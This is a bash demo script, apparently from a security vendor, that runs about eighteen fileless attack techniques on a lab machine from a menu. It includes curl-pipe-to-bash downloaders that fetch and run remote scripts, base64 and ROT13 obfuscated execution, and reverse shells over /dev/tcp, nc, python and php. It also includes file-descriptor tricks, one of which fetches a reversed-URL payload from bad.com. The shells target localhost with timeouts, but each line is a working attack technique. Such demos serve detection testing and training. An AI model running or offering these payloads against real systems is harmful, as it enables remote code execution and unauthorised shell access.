#!/usr/bin/env bash
# ============================================================
#   fileless-execution-demo.sh
#   Purpose : 20 file-less attacks (categorised) for lab tests
#   Author  : Lior Boehm  –  Upwind Security demo
# ============================================================
set -eo pipefail   # (no -u → avoids unbound-var crashes)

######################## 🎨  COLOURS  #########################
BOLD=$'\e[1m';  RESET=$'\e[0m'
CYAN=$'\e[36m'; GREEN=$'\e[32m'; YELLOW=$'\e[33m'; RED=$'\e[31m'

######################## 🖼️  BANNER  ##########################
clear
command -v figlet >/dev/null && figlet "upwind.io" || echo "UPWIND.IO"
echo -e "${CYAN}${BOLD}Fileless Execution Demonstration  –  Lior Boehm${RESET}\n"

######################## ⚙️  LAB CONFIG  ######################
LHOST="127.0.0.1"
LPORT1="4444"; LPORT2="5555"; LPORT3="9001"
RAW="https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main"

##################### 🗂️  CATEGORY ARRAYS  ####################
##  All payload lines are quoted in single quotes so nothing
##  executes or expands UNTIL you actually select it.

## 1️⃣  Downloaders
DOWNLOADERS=(
'curl -s "'"$RAW"'/payload.sh" | bash'
'exec 3< <(curl -s "'"$RAW"'/payload.sh"); bash /proc/self/fd/3'
'X=$(curl -s "'"$RAW"'/test.py"); python3 -c "$X"'
'bash -c "$(curl -s '"$RAW"'/payload.sh)"'
)

## 2️⃣  Encoding / Obfuscation
ENCODING=(
'echo ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK | base64 -d | bash'
'bash -c "$(curl -s '"$RAW"'/b64.txt | base64 -d)"'
'bash -c "$(echo ENFUGBYY | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"'
'exec 8< <(echo ZWNobyBoZWxsbw== | base64 -d); bash /proc/self/fd/8'
)

## 3️⃣  Reverse shells  (all timeout-limited)
REVERSE_SHELLS=(
'timeout 2s bash -c "bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT1"' 0>&1" &'
'timeout 2s nc -e /bin/sh '"$LHOST"' '"$LPORT1"' &'
'timeout 2s python3 -c "import os,pty,socket; s=socket.socket(); s.connect((\"'"$LHOST"'\",'"$LPORT2"')); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")" &'
'timeout 2s php -r '\''
$s=fsockopen("'"$LHOST"'",7777);exec("/bin/sh -i <&3 >&3 2>&3");'\'' &'
'timeout 2s bash -c "bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT3"' 0>&1" &'
)

## 4️⃣  Advanced FD / Tricks
ADVANCED_FD=(
'exec 3< <(echo hs.doaolyp/moc.dab//:ptth | rev | xargs curl -s); bash /proc/self/fd/3'
'exec 3< /bin/bash; /proc/self/fd/3 -c "echo FD-spawned shell"'
'exec {FD}<>/dev/tcp/'"$LHOST"'/9898; echo whoami >&$FD; cat <&$FD &'
'exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s '"$RAW"'/shell.sh); bash /proc/self/fd/9'
'python3 -c "import urllib.request,base64,sys; exec(base64.b64decode(urllib.request.urlopen(\"'"$RAW"'/b64.txt\").read()))"'
)

##################### 📑  CATEGORY INDEX  #####################
declare -A GROUPS=(
  [1]="Downloaders"
  [2]="Encoding"
  [3]="Reverse_Shells"
  [4]="Advanced_FD"
)

################### 🚀  EXECUTION HELPERS  ####################
run_cmd() {
  local cmd="$1"
  echo -e "${CYAN}[>] ${cmd}${RESET}"
  bash -c "$cmd" &
  sleep 0.5          # tiny gap so output is readable
}

run_group() {
  local -n arr=$1    # nameref to array
  local gname=$2
  echo -e "\n${GREEN}${BOLD}=== $gname ===${RESET}"
  for c in "${arr[@]}"; do run_cmd "$c"; done
}

#################### 🖥️  MAIN MENU LOOP  ######################
while true; do
  echo -e "\n${YELLOW}${BOLD}=========== MAIN MENU ===========${RESET}"
  echo "  1) Downloaders"
  echo "  2) Encoding / Obfuscation"
  echo "  3) Reverse Shells"
  echo "  4) Advanced FD Tricks"
  echo "  a) Run ALL attacks"
  echo "  q) Quit"
  read -rp $'\nChoose an option: ' opt

  case "$opt" in
     1) run_group DOWNLOADERS    "${GROUPS[1]}" ;;
     2) run_group ENCODING       "${GROUPS[2]}" ;;
     3) run_group REVERSE_SHELLS "${GROUPS[3]}" ;;
     4) run_group ADVANCED_FD    "${GROUPS[4]}" ;;
    [Aa])                         # all categories
         run_group DOWNLOADERS    "${GROUPS[1]}"
         run_group ENCODING       "${GROUPS[2]}"
         run_group REVERSE_SHELLS "${GROUPS[3]}"
         run_group ADVANCED_FD    "${GROUPS[4]}";;
    [Qq]) echo -e "${BOLD}Exiting.${RESET}"; exit 0 ;;
       *) echo -e "${RED}Invalid choice${RESET}" ;;
  esac
done
